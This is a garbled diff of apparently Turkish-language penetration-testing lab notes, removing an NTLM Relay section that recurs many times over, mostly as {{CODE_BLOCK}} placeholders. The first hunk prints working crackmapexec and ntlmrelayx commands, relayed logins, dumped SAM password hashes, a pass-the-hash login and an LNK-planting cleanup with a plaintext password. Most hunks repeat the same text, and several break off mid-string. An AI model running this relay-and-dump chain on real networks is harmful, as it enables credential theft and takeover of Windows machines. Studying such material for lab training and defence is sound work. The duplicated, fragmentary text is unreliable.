@@ -3138,135 +3138,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-```
-proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt
-
-SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
-17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
-(SMBv1:False)
-SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
-17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
-(SMBv1:False)
-
-cat relay.txt
-172.16.1.5
-```
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-```
-sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
-
-Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
-Corporation
-[*] Protocol Client DCSYNC loaded..
-[*] Protocol Client HTTP loaded..
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client IMAPS loaded..
-[*] Protocol Client IMAP loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client MSSQL loaded..
-[*] Protocol Client RPC loaded..
-[*] Protocol Client SMB loaded..
-[*] Protocol Client SMTP loaded..
-[*] Running in relay mode to hosts in targetfile
-[*] Setting up SMB Server
-[*] Setting up WCF Server
-[*] Setting up RAW Server on port 6666
-[*] Servers started, waiting for connections
-```
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-```
-sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
-
-Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
-Corporation
-<SNIP>
-[*] Servers started, waiting for connections
-[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
-controlled, attacking target smb://172.16.1.5
-[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
-[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
-controlled, but there are no more targets left!
-[*] Service RemoteRegistry is in stopped state
-[*] Starting service RemoteRegistry
-[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
-660cf3453:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
-0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
-d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
-ee1958e7f78070:::
-localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
-ed3f3ac:::
-sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
-6:::
-htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
-:::
-[*] Done dumping SAM hashes for host: 172.16.1.5
-[*] Stopping service RemoteRegistry
-```
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-```
-proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H
-30b3783ce2abf1af70f77d0660cf3453 --local-auth
-
-SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
-17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
-SMB 172.16.1.5 445 MS01 [+]
-MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
-```
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-```
-proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
--M slinky -o NAME=important CLEANUP=YES
-
-[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
-SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
-17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
-(SMBv1:False)
-SMB 172.16.1.10 445 DC01 [+]
-inlanefreight.htb\grace:Inlanefreight01!
-SLINKY 172.16.1.10 445 DC01 [+] Found writable
-share: HR
-SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
-on the HR share
-SLINKY 172.16.1.10 445 DC01 [+] Found writable
-share: IT-Tools
-SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
-on the IT-Tools share
-```, 'print
+, 'print
 
 Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
 
@@ -3493,44 +3365,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
+, 'netlogon', 'sysvol']
 SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
 ['ico', 'lnk']
 SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
@@ -3763,44 +3598,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'print
+, 'print
 
 {{CODE_BLOCK_96}}
 
@@ -4016,44 +3814,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'print
+, 'print
 
 Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
 
@@ -4280,44 +4041,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
+, 'netlogon', 'sysvol']
 SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
 ['ico', 'lnk']
 SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
@@ -4550,44 +4274,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
+, 'netlogon', 'sysvol']
 SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
 ['ico', 'lnk']
 SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
@@ -4810,44 +4497,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'print
+, 'print
 
 Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
 
@@ -5074,44 +4724,7 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
+, 'netlogon', 'sysvol']
 SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
 ['ico', 'lnk']
 SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
@@ -5344,41 +4957,3 @@ Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olm
 NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
 
 
-### **NTLM Relay**
-
-Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
-
-Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
-
-### Getting Relay List
-
-{{CODE_BLOCK_117}}
-
-
-**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
-
-Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
-
-### Execute NTLMRelayX
-
-{{CODE_BLOCK_118}}
-
-Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
-
-Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
-
-{{CODE_BLOCK_119}}
-
-Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
-
-### Local Hesapları Test Etme
-
-{{CODE_BLOCK_120}}
-
-### Her Şeyi Temizleyin
-
-Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
-
-### Cleanup
-
-{{CODE_BLOCK_121}}
